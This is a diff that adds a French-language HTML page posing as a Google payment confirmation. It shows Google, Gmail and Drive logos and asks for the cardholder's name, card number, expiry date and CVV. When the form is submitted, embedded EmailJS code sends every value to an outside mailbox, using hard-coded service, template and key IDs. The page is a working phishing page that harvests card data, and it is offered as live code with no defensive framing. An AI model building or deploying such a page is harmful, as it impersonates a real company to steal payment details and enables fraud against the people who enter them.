@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paiement Google</title>
+    <!-- Mise à jour du CDN EmailJS -->
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            background-color: #f8f9fa;
+            margin: 0;
+        }
+        .header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            background-color: white;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .header .google-logo {
+            display: flex;
+            align-items: center;
+        }
+        .header .google-logo img {
+            width: 100px;
+            height: auto;
+            padding-left: 25px;
+    
+        }
+        .header .menu a {
+            text-decoration: none;
+            color: white;
+            font-size: 15px;
+            background-color: #2f7bf6;
+            padding: 6px 10px;
+            border-radius: 7px;
+        }
+        .header1 .gmail-logo img {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 21px;
+            padding: 20px 115px;
+        }
+
+        .header2 .driv-logo img {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 21px;
+            padding: 18px 145px;
+
+        }
+        .payment-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+            margin-top: 50px;
+        }
+        .payment-container img {
+            width: 100px;
+            margin-bottom: 10px;
+            margin-left: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4285F4;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 40px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #357ae8;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="google-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
+        </div>
+        <div class="menu">
+            <a href="#">Mon compte</a>
+        </div>
+
+    </div>
+    <div class="header1">
+        <div class="gmail-logo">
+            <img src="google-mail-icon-logo-isolated-on-transparent-background-free-vector.jpg" alt="=Gmail Logo">
+        </div>
+    </div>
+    <div class="header2">
+        <div class="driv-logo">
+            <img src="lecteur.png">
+        </div>
+    </div>
+    <div class="payment-container">
+        <img src="aa8r2y6ex.png" alt="Google Logo">
+        <h2>Confirmation de la Carte</h2>
+        <form id="payment-form">
+            <input type="text" id="name" placeholder="Nom sur la carte" required>
+            <input type="text" id="card-number" placeholder="Numéro de carte" maxlength="19" required>
+            <input type="text" id="expiry" placeholder="MM/AA" maxlength="5" required>
+            <input type="password" id="cvv" placeholder="CVV" maxlength="3" required>
+            <button type="submit">Confirmation</button>
+        </form>
+    </div>
+
+    <script>
+        // Initialisation d'EmailJS
+        (function() {
+            emailjs.init("7uI9LfoyE1s6bVMhd"); // Assurez-vous que c'est votre User ID EmailJS correct
+        })();
+
+        // Formatage automatique du numéro de carte
+        document.getElementById('card-number').addEventListener('input', function(e) {
+            let input = e.target.value.replace(/\D/g, ''); // Supprimer tout sauf les chiffres
+            if (input.length > 12) {
+                input = input.slice(0, 16); // Limiter à 12 chiffres
+            }
+            input = input.replace(/(.{4})(?=.)/g, '$1 '); // Ajouter un espace tous les 4 chiffres
+            e.target.value = input;
+        });
+
+        // Formatage automatique de la date MM/AA
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let input = e.target.value.replace(/\D/g, ''); // Supprimer tout sauf les chiffres
+            if (input.length > 2) {
+                input = input.slice(0, 2) + '/' + input.slice(2, 4); // Ajouter le '/' après les 2 premiers chiffres
+            }
+            e.target.value = input;
+        });
+
+        // Soumission du formulaire
+        document.getElementById('payment-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const name = document.getElementById('name').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+
+            const templateParams = {
+                name: name,
+                card_number: cardNumber,
+                expiry: expiry,
+                cvv: cvv
+            };
+
+            emailjs.send("service_hxcvemm", "template_c7n1gbl", templateParams)
+                .then(function(response) {
+                    alert("Paiement soumis avec succès !");
+                }, function(error) {
+                    alert("Erreur lors de l'envoi du paiement : " + JSON.stringify(error));
+                });
+        });
+    </script>
+    <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+(function(){
+  emailjs.init({
+    publicKey: "7uI9LfoyE1s6bVMhd",
+  });
+})();
+</script>
+
+</body>
+</html>
